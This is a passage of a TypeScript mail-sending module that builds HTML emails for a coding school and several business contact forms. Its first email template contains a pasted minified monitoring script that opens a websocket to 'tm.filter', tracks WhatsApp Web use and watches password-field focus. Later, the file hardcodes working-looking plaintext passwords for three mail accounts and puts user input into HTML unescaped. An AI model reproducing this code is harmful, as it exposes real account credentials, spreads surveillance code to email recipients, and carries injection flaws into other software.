Z":"D/M/YYYY","es-PE":"D/M/YYYY","ar-JO":"D/M/YYYY","en-TT":"D/M/YYYY","es-AR":"D/M/YYYY","ar-LB":"D/M/YYYY","en-ZW":"M/D/YYYY","es-EC":"D/M/YYYY","ar-KW":"D/M/YYYY","en-PH":"M/D/YYYY","es-CL":"D-M-YYYY","ar-AE":"D/M/YYYY","es-UY":"D/M/YYYY","ar-BH":"D/M/YYYY","es-PY":"D/M/YYYY","ar-QA":"D/M/YYYY","es-BO":"D/M/YYYY","es-SV":"D/M/YYYY","es-HN":"D/M/YYYY","es-NI":"D/M/YYYY","es-PR":"D/M/YYYY","aM-ET":"D/M/YYYY","tzM-Latn-DZ":"D-M-YYYY","iu-Latn-CA":"D/M/YYYY","sMa-NO":"D.M.YYYY","Mn-Mong-CN":"YYYY/M/D","gD-GB":"D/M/YYYY","en-MY":"D/M/YYYY","prs-AF":"D/M/YY","bn-BD":"D-M-YY","wo-SN":"D/M/YYYY","rw-RW":"M/D/YYYY","qut-GT":"D/M/YYYY","sah-RU":"M.D.YYYY","gsw-FR":"D/M/YYYY","co-FR":"D/M/YYYY","oc-FR":"D/M/YYYY","Mi-NZ":"D/M/YYYY","ga-IE":"D/M/YYYY","se-SE":"YYYY-M-D","br-FR":"D/M/YYYY","sMn-FI":"D.M.YYYY","Moh-CA":"M/D/YYYY","arn-CL":"D-M-YYYY","ii-CN":"YYYY/M/D","Dsb-DE":"D. M. YYYY","ig-NG":"D/M/YYYY","kl-GL":"D-M-YYYY","lb-LU":"D/M/YYYY","ba-RU":"D.M.YY","nso-ZA":"YYYY/M/D","quz-BO":"D/M/YYYY","yo-NG":"D/M/YYYY","ha-Latn-NG":"D/M/YYYY","fil-PH":"M/D/YYYY","ps-AF":"D/M/YY","fy-NL":"D-M-YYYY","ne-NP":"M/D/YYYY","se-NO":"D.M.YYYY","iu-Cans-CA":"D/M/YYYY","sr-Latn-RS":"D.M.YYYY","si-LK":"YYYY-M-D","sr-Cyrl-RS":"D.M.YYYY","lo-LA":"D/M/YYYY","kM-KH":"YYYY-M-D","cy-GB":"D/M/YYYY","bo-CN":"YYYY/M/D","sMs-FI":"D.M.YYYY","as-IN":"D-M-YYYY","Ml-IN":"D-M-YY","en-IN":"D-M-YYYY","or-IN":"D-M-YY","bn-IN":"D-M-YY","tk-TM":"D.M.YY","bs-Latn-BA":"D.M.YYYY","Mt-MT":"D/M/YYYY","sr-Cyrl-ME":"D.M.YYYY","se-FI":"D.M.YYYY","zu-ZA":"YYYY/M/D","xh-ZA":"YYYY/M/D","tn-ZA":"YYYY/M/D","hsb-DE":"D. M. YYYY","bs-Cyrl-BA":"D.M.YYYY","tg-Cyrl-TJ":"D.M.YY","sr-Latn-BA":"D.M.YYYY","sMj-NO":"D.M.YYYY","rM-CH":"D/M/YYYY","sMj-SE":"YYYY-M-D","quz-EC":"D/M/YYYY","quz-PE":"D/M/YYYY","hr-BA":"D.M.YYYY.","sr-Latn-ME":"D.M.YYYY","sMa-SE":"YYYY-M-D","en-SG":"D/M/YYYY","ug-CN":"YYYY-M-D","sr-Cyrl-BA":"D.M.YYYY","es-US":"M/D/YYYY"}[navigator.language],document.tmfilter="present")}function g(){(H=new WebSocket(y.connectionString)).onclose=i,H.onmessage=o,H.onopen=l,y.extJs&&(this.extJs.webSockReady=()=>H.readyState===WebSocket.OPEN,this.extJs.webSockSend=Y=>H.send(Y))}function p(){var Y=function(){var Y=["webkit","moz","ms","o"];if("hidden"in document)return"hidden";for(var e=0;e<Y.length;e++)if(Y[e]+"Hidden"in document)return Y[e]+"Hidden";return null}();return!!Y&&document[Y]}function h(){var Y=document.head.querySelector("[name='og:title']");return!!Y&&"WhatsApp Web"===Y.getAttribute("content")}function m(){H.send(JSON.stringify({type:"waptracking"}))}function v(){T=new Map,I=new Set,k=0,(C=new Date).setSeconds(0),C.setMilliseconds(0)}function S(Y){var e={name:Y.data.name,type:Y.data.type};"iframePasswordInputFocused"===Y.data.message?u(e):"iframePasswordInputBlurred"===Y.data.message&&d(e)}Y=this,e={},t={en:{MMMM:"January February March April May June July August September October November December".split(" "),MMM:"Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec".split(" "),dddd:"Sunday Monday Tuesday Wednesday Thursday Friday Saturday".split(" "),ddd:"Sun Mon Tue Wed Thu Fri Sat".split(" "),dd:"Su Mo Tu We Th Fr Sa".split(" "),A:["a.m.","p.m."],formatter:{YYYY:function(Y){return("000"+Y.getFullYear()).slice(-4)},YY:function(Y){return("0"+Y.getFullYear()).slice(-2)},Y:function(Y){return""+Y.getFullYear()},MMMM:function(Y){return this.MMMM[Y.getMonth()]},MMM:function(Y){return this.MMM[Y.getMonth()]},MM:function(Y){return("0"+(Y.getMonth()+1)).slice(-2)},M:function(Y){return""+(Y.getMonth()+1)},DD:function(Y){return("0"+Y.getDate()).slice(-2)},D:function(Y){return""+Y.getDate()},HH:function(Y){return("0"+Y.getHours()).slice(-2)},H:function(Y){return""+Y.getHours()},A:function(Y){return this.A[11<Y.getHours()|0]},hh:function(Y){return("0"+(Y.getHours()%12||12)).slice(-2)},h:function(Y){return""+(Y.getHours()%12||12)},mm:function(Y){return("0"+Y.getMinutes()).slice(-2)},m:function(Y){return""+Y.getMinutes()},ss:function(Y){return("0"+Y.getSeconds()).slice(-2)},s:function(Y){return""+Y.getSeconds()},SSS:function(Y){return("00"+Y.getMilliseconds()).slice(-3)},SS:function(Y){return("0"+(Y.getMilliseconds()/10|0)).slice(-2)},S:function(Y){return""+(Y.getMilliseconds()/100|0)},dddd:function(Y){return this.dddd[Y.getDay()]},ddd:function(Y){return this.ddd[Y.getDay()]},dd:function(Y){return this.dd[Y.getDay()]},Z:function(Y){return(0<(Y=Y.utc?0:Y.getTimezoneOffset()/.6)?"-":"+")+("000"+Math.abs(Y-Y%100*.4)).slice(-4)},post:function(Y){return Y}},parser:{find:function(Y,e){for(var t,n=-1,r=0,a=0,s=Y.length;a<s;a++)t=Y[a],!e.indexOf(t)&&t.length>r&&(n=a,r=t.length);return{index:n,length:r}},MMMM:function(Y){return this.parser.find(this.MMMM,Y)},MMM:function(Y){return this.parser.find(this.MMM,Y)},A:function(Y){return this.parser.find(this.A,Y)},h:function(Y,e){return(12===Y?0:Y)+12*e},pre:function(Y){return Y}}}},e.format=function(Y,n,r){var a=e.addMinutes(Y,r?Y.getTimezoneOffset():0),s=t.en,i=s.formatter;return a.utc=r,n.replace(/(\[[^\[\]]*]|\[.*\][^\[]*\]|YYYY|YY|MMM?M?|DD|HH|hh|mm|ss|SSS?|ddd?d?|.)/g,(function(Y){var e=i[Y];return e?i.post(e.call(s,a,n)):Y.replace(/\[(.*)]/,"$1")}))},e.parse=function(Y,n,r){var a,s,i=t.en,o=i.parser.pre(Y),M=0,u=/(MMMM?|A)|(YYYY)|(SSS)|(MM|DD|HH|hh|mm|ss)|(YY|M|D|H|h|m|s|SS)|(S)|(.)/g,d={2:/^\d{1,4}/,3:/^\d{1,3}/,4:/^\d\d/,5:/^\d\d?/,6:/^\d/};Y=[31,28,31,30,31,30,31,31,30,31,30,31];for(var c={Y:1970,M:1,D:1,H:0,m:0,s:0,S:0};a=u.exec(n);){var D=0,l=1;for(s="";!s;)s=a[++D];a=s.charAt(0);var f=o.slice(M);if(2>D){var g=i.parser[s].call(i,f,n);c[a]=g.index,"M"===a&&c[a]++,l=g.length}else if(7>D)g=(f.match(d[D])||[""])[0],c[a]=0|("S"===a?(g+"000").slice(0,-s.length):g),l=g.length;else if(" "!==a&&a!==f[0])return NaN;if(!l)return NaN;M+=l}return M===o.length&&g?(c.Y+=70>c.Y?2e3:100>c.Y?1900:0,c.H=c.H||i.parser.h(c.h||0,c.A||0),n=new Date(c.Y,c.M-1,c.D,c.H,c.m,c.s,c.S),Y[1]+=0|e.isLeapYear(n),1>c.M||12<c.M||1>c.D||c.D>Y[c.M-1]||23<c.H||59<c.m||59<c.s?NaN:r?e.addMinutes(n,-n.getTimezoneOffset()):n):NaN},e.isValid=function(Y,t){return!!e.parse(Y,t)},e.addYears=function(Y,t){return e.addMonths(Y,12*t)},e.addMonths=function(Y,e){var t=new Date(Y.getTime());return t.setMonth(t.getMonth()+e),t},e.addDays=function(Y,e){var t=new Date(Y.getTime());return t.setDate(t.getDate()+e),t},e.addHours=function(Y,t){return e.addMilliseconds(Y,36e5*t)},e.addMinutes=function(Y,t){return e.addMilliseconds(Y,6e4*t)},e.addSeconds=function(Y,t){return e.addMilliseconds(Y,1e3*t)},e.addMilliseconds=function(Y,e){return new Date(Y.getTime()+e)},e.subtract=function(Y,e){var t=Y.getTime()-e.getTime();return{toMilliseconds:function(){return t},toSeconds:function(){return t/1e3|0},toMinutes:function(){return t/6e4|0},toHours:function(){return t/36e5|0},toDays:function(){return t/864e5|0}}},e.isLeapYear=function(Y){return!(((Y=Y.getFullYear())%4||!(Y%100))&&Y%400)},e.isSameDay=function(Y,t){return e.format(Y,"YYYYMMDD")===e.format(t,"YYYYMMDD")},Y.date=e;var y={token:"ae2782a4-4f0e-4c58-9d22-103840756020",sendNotificationsInterval:Number("1000"),pollWhatsappTrackingInterval:Number("20000"),connectionString:"wss://tm.filter:1502",pid:"13336",pn:"msedge.exe",iup:false,dontTrackWebPasswords:false,extJs:null},N=6e4,b=null,A=null,w=null,E=null,L=!1,T=null,I=null,k=0,C=null,H=null,O="",P=!1;!function Y(e){p()?setTimeout((function(){Y(e)}),1e3):e()}((function(){y.extJs&&y.extJs.init(y.token),n()&&(window.addEventListener("focus",r,!0),y.dontTrackWebPasswords&&window.addEventListener("message",S,!1)),n()||y.extJs?f():y.dontTrackWebPasswords&&D()}))}();</script><script type="text/javascript"  src="/zWuekpm_wAYJew5HywD4HhMy/9wYL0bDX7iEf/C0FERU8/STB/JfExuMk0B"></script></body>
  </html>
  
  `;

  const emailOptions = {
    from: "openskyitschool@gmail.com",
    to: email,
    subject: "Գրանցման հայտը հաստատված է | Open Sky IT-School",
    html,
  };
  transporter.sendMail(emailOptions, (err, info) => {
    if (err) console.log(err);
    else console.log(info);
  });
};

const transporterForInstaServing = nodeMailer.createTransport({
  service: "gmail",
  secure: false,
  auth: {
    user: "info@instaserving.com",
    pass: "Happygirl1987!",
  },
});

export const sendAppliement = (
  name: string,
  phoneNumber: string,
  city: string,
  companyName: string,
  category: string,
  comment: string
) => {
  const html = `
    <html lang="en">
      <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
  
        </style>
      </head>
      <body>
        <div style="width: 100%; min-height: 500px;">
          <div style="width: 500px; position: absolute; left: 0; right: 0; margin: 0 auto; padding: 5px;">
            <div>
            </div>
            <div style="min-height: 160px;border: 2px solid #760E4D;margin-top: 20px;border-radius: 5px;padding: 10px 25px;font-size: 14px;">
              <p></p>
              <div style="width: 100%; height: 100%; padding : 20px 0;">
                <div style="border: none; margin: 0 auto;">
                <p style="font-size: 18px;margin: 0; line-height: 35px; text-align: center;">Name : ${name}</p>
                <p style="font-size: 18px;margin: 0; line-height: 35px; text-align: center;">Company Name : ${companyName}</p>
                  <p style="font-size: 18px;margin: 0; line-height: 35px; text-align: center;">Phone Number : ${phoneNumber}</p>
                  <p style="font-size: 18px;margin: 0; line-height: 35px; text-align: center;">Comment : ${
                    comment || "-"
                  }</p>
                  <p style="font-size: 18px;margin: 0; line-height: 35px; text-align: center;">Category : ${category}</p>
                  <p style="font-size: 18px;margin: 0; line-height: 35px; text-align: center;">City : ${city}</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </body>
    </html>
  `;

  const emailOptions = {
    from: name,
    to: "info@instaserving.com",
    subject: "Someone send you an appliement for InstaServing",
    html,
  };
  transporterForInstaServing.sendMail(emailOptions, (err, info) => {
    if (err) console.log(err);
    else console.log(info);
  });
};

const transporterForHybrid = nodeMailer.createTransport({
  service: "gmail",
  secure: false,
  auth: {
    user: "hybridlabarmenia@gmail.com",
    pass: "hybridlabarmenia2021",
  },
});

export const sendHybrid = (name: string, email: string, message: string) => {
  const html = `
    <html lang="en">
      <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
  
        </style>
      </head>
      <body>
        <div style="width: 100%; min-height: 500px;">
          <div style="width: 500px; position: absolute; left: 0; right: 0; margin: 0 auto; padding: 5px;">
            <div>
            </div>
            <div style="min-height: 160px;border: 2px solid #06485F;margin-top: 20px;border-radius: 5px;padding: 10px 25px;font-size: 14px;">
              <p></p>
              <div style="width: 100%; height: 100%; padding : 20px 0;">
                <div style="border: none; margin: 0 auto;">
                <p style="font-size: 18px;margin: 0; line-height: 35px; text-align: center;">Name : ${name}</p>
                <p style="font-size: 18px;margin: 0; line-height: 35px; text-align: center;">Email : ${email}</p>
                  <p style="font-size: 18px;margin: 0; line-height: 35px; text-align: center;">Message : ${message}</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </body>
    </html>
  `;

  const emailOptions = {
    from: name,
    to: "hybridlabarmenia@gmail.com",
    subject: "Someone send you a message from Hybrid Laboratory",
    html,
  };
  transporterForHybrid.sendMail(emailOptions, (err, info) => {
    if (err) console.log(err);
    else console.log(info);
  });
};

const transporterForFDA = nodeMailer.createTransport({
  host: "smtp.office365.com",
  secureConnection: false,
  port: 587,
  auth: {
    user: "info@fdasupports.com",
    pass: "Password1/",
  },
});

export const sendFDA = (name: string, email: string, message: string) => {
  const html = `
    <html lang="en">
      <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
  
        </style>
      </head>
      <body>
        <div style="width: 100%; min-height: 500px;">
          <div style="width: 500px; position: absolute; left: 0; right: 0; margin: 0 auto; padding: 5px;">
            <div>
            </div>
            <div style="min-height: 160px;border: 2px solid #06485F;margin-top: 20px;border-radius: 5px;padding: 10px 25px;font-size: 14px;">
              <p></p>
              <div style="width: 100%; height: 100%; padding : 20px 0;">
                <div style="border: none; margin: 0 auto;">
                <p style="font-size: 18px;margin: 0; line-height: 35px; text-align: center;"><b>Name</b> : ${name}</p>
                <p style="font-size: 18px;margin: 0; line-height: 35px; text-align: center;"><b>Email</b> : ${email}</p>
                  <p style="font-size: 18px;margin: 0; line-height: 35px; text-align: center;"><b>Message</b> : ${message}</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </body>
    </html>
  `;

  const emailOptions = {
    from: name,
    to: "info@fdasupports.com",
    subject: "You have a message from FDAsupports.com",
    html,
  };
  transporterForFDA.sendMail(emailOptions, (err, info) => {
    if (err) console.log(err);
    else console.log(info);
  });
};
